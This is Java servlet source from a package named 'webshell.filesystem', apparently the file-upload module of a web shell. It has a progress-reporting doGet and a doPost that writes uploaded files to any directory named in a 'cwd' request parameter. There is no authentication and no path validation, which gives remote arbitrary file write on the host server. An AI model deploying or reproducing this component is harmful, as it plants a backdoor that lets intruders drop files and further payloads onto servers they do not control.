package webshell.filesystem;

import javax.servlet.Servlet;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;

import java.io.*;
import java.util.*;

import javax.servlet.http.*;

import org.apache.commons.fileupload.*;

import javax.servlet.ServletException;

import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

	
@WebServlet(urlPatterns = "/upload")
public class FileUploadServlet extends HttpServlet implements Servlet {

    private static final long serialVersionUID = 2740693677625051632L;

    public FileUploadServlet() {
        super();
    }

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter out = response.getWriter();
	    HttpSession session = request.getSession();
        FileUploadListener listener = null;
		StringBuffer buffy = new StringBuffer();
	    long bytesRead = 0, contentLength = 0;

        if (session == null) {
            return;
	    } else if (session != null) {
            listener = (FileUploadListener) session.getAttribute("LISTENER");

	        if (listener == null) {
		        return;
            } else {
	            bytesRead = listener.getBytesRead();
                contentLength = listener.getContentLength();
	        }
        }

	    response.setContentType("text/xml");

	    buffy.append("<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n");
		buffy.append("<response>\n");
        buffy.append("\t<bytes_read>" + bytesRead + "</bytes_read>\n");
        buffy.append("\t<content_length>" + contentLength + "</content_length>\n");

        if (bytesRead == contentLength) {
            buffy.append("\t<finished />\n");
	        session.setAttribute("LISTENER", null);
        } else {
	        long percentComplete = ((100 * bytesRead) / contentLength);
            buffy.append("\t<percent_complete>" + percentComplete + "</percent_complete>\n");
	    }
        buffy.append("</response>\n");
	    out.println(buffy.toString());
        out.flush();
	    out.close();
    }

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        FileItemFactory factory = new DiskFileItemFactory();
	    ServletFileUpload upload = new ServletFileUpload(factory);
        FileUploadListener listener = new FileUploadListener();
	    HttpSession session = request.getSession();
		session.setAttribute("LISTENER", listener);
        upload.setProgressListener(listener);
	    List uploadedItems = null;
		FileItem fileItem = null;
        String filePath = request.getParameter("cwd");

	    try {
		    uploadedItems = upload.parseRequest(request);
            Iterator i = uploadedItems.iterator();

	        while (i.hasNext()) {
		        fileItem = (FileItem) i.next();
			    if (fileItem.isFormField() == false) {
				    if (fileItem.getSize() > 0) {
					    File uploadedFile = null;
						String myFullFileName = fileItem.getName(), myFileName = "", slashType = (myFullFileName.lastIndexOf("\\") > 0) ? "\\" : "/";
                        int startIndex = myFullFileName.lastIndexOf(slashType);
	                    myFileName = myFullFileName.substring(startIndex + 1, myFullFileName.length());
		                uploadedFile = new File(filePath, myFileName);
			            fileItem.write(uploadedFile);
				    }
                }
	        }
		} catch (FileUploadException e) {
            e.printStackTrace();
	    } catch (Exception e) {
		    e.printStackTrace();
        }
	}
}